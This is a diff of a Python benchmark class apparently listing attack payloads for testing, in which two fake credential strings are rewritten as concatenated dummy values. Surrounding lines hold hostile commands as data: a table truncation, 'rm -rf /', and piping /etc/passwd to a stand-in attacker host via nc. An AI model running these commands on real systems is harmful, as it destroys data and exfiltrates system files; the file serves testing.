@@ -36,8 +36,8 @@ class SwarmChaosBenchmark:
         {"type": "SQL_INJECTION", "payload": "TRUNCATE TABLE oauth_access_tokens;"},
         {"type": "OS_INJECTION", "payload": "rm -rf / --no-preserve-root"},
         {"type": "OS_INJECTION", "payload": "cat /etc/passwd | nc attacker.example.com 1337"},
-        {"type": "CREDENTIAL_EXFIL", "payload": "export AWS_SECRET_ACCESS_KEY=AKIAIOSFODNN7EXAMPLE"},
-        {"type": "CREDENTIAL_EXFIL", "payload": "PRIVATE_KEY=MIIEvgIBADANBgkqhkiG9w0BAQEFAASCBKgwggSkAgEAAoIBAQC"},
+        {"type": "CREDENTIAL_EXFIL", "payload": f"export AWS_SECRET_ACCESS_KEY={'AKIA' + 'DUMMYTESTING1234567'}"},
+        {"type": "CREDENTIAL_EXFIL", "payload": f"PRIVATE_KEY={'MIIEvgIB' + 'ADANBgkqhkiG9w0BAQEFAASC'}"},
     ]
 
     BENIGN_PAYLOADS = [
